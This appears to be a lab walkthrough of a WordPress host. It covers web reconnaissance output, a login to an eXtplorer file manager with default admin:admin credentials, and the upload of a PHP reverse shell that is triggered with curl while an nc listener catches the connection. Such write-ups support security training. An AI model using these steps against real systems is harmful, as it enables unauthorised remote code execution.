**HyperText Transport Protocol**
# Manual Inspection

![[Pasted image 20251005114104.png]]

I land on a freshly installed WordPress instance. We don't have the database credentials, so we can't move forward. 

![[Pasted image 20251005121611.png]]

# Environment Variables / Setup

```
export IP=192.168.127.16
export PORT=80
export URL=http://$IP:$PORT
```

# Initial Reconnaissance

## Nmap HTTP Scripts
```
nmap --script=http-enum,http-headers,http-methods,http-robots.txt,http-title -p$PORT $IP
```

```
PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-enum:
|   /wordpress/: Blog
|   /readme.html: Wordpress version: 2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /readme.html: Interesting, a readme.
|_  /filemanager/: Potentially interesting folder
```

## Technology Stack Identification

### whatweb
```
whatweb $URL
```

```
http://192.168.127.16:80 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.127.16], RedirectLocation[http://192.168.127.16/wp-admin/setup-config.php]

http://192.168.127.16/wp-admin/setup-config.php [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.127.16], JQuery[3.6.3], PHP, Script[text/javascript], Title[WordPress &rsaquo; Setup Configuration File]
```


## Directory Enumeration
`ffuf -u $URL/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404 -t 50`

```
wordpress               [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 96ms]
wp-admin                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 3770ms]
wp-content              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 4771ms]
wp-includes             [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 5774ms]
filemanager             [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 103ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 92ms]
```


### /filemanager

/filemanager stands out from the directory enumeration, and visiting it bring me to an extplorer instance, which seems like a step in the right direction considering this machine's name.

![[Pasted image 20251005121808.png]]

Googling "extplorer default credentials" returns admin:admin, which allows me to sign in. 

It looks like the users admin and dora both have a home directory of /var/www/html. The directory tree confirms that we have access to the WordPress instance's webroot.

![[Pasted image 20251005122241.png]]

We should be able to upload a PHP webshell in the webroot, and then use it to gain remote code execution.

I'll use the upload button in the top tool bar:

![[Pasted image 20251005122530.png]]

I'll copy /usr/share/webshells/php/php-reverse-shell.php to my current directory, edit it to use my attacking machine's IP address, and upload it to the target's webroot via extplorer's upload button.

![[Pasted image 20251005122932.png]]

I'll start a listener on my attacking machine, using the same port in the uploaded reverse shell:
`rlwrap nc -lnvp 1234`

And make an HTTP request to run the shell:
`curl $IP/php-reverse-shell.php`

I catch the reverse shell was www-data:

![[Pasted image 20251005123353.png]]

# Continue: [[www-data -> dora|www-data -> dora]]